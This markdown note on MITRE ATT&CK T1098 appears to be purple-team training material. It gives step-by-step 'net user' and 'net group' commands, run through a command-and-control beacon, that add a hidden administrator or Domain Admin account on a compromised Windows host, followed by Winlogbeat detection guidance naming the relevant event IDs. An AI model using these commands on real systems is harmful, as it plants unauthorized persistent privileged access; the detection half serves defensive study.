# [Account Manipulation](https://attack.mitre.org/techniques/T1098/)

## **LOCAL USER Exploit syntax:**
1. Get a beacon with local/domain administrative privileges.

2. In parrot open a blank text file and paste the following commands into it based on if you want a domain or local user
    ### Local user
    ```cmd
    net user /add Gearhead Squanch123;
    net localgroup administrators /add Gearhead;
    ```
    ### Domain User (make sure you have domain admin creds)
    ```cmd
    net user /add Gearhead Squanch123 /domain; 
    net group "Domain Admins" /add Gearhead /domain;
    ```

3. Save the file with as `Pencilvester.ps1` to `/tmp`

4. Run
	```sh
	sudo chmod +x /tmp/Pencilvester.ps1
	```

5.  In posh, run
    ```powershell
	pslo /tmp/Pencilvester.ps1
    ```
> **NOTE:** that the above .ps1 file syntax and be modified to change the users password, delete the user, added to a different group(using net localgroup), etc
---

## **Detection Technique:**
* Monitor windows events related to account manipulation

* Winlogbeat:
    * Monitor `net.exe` and `net1.exe` processes
    * Monitor the following event codes: 
        * 4720: Added user account
    
        * 4726: Deleted user account
    
        * 4738: Modified user account such as password change
    
        * 4732: Added user account to Administrators group
    
        * 4733: Deleted user account from Administrators group
    
    
    
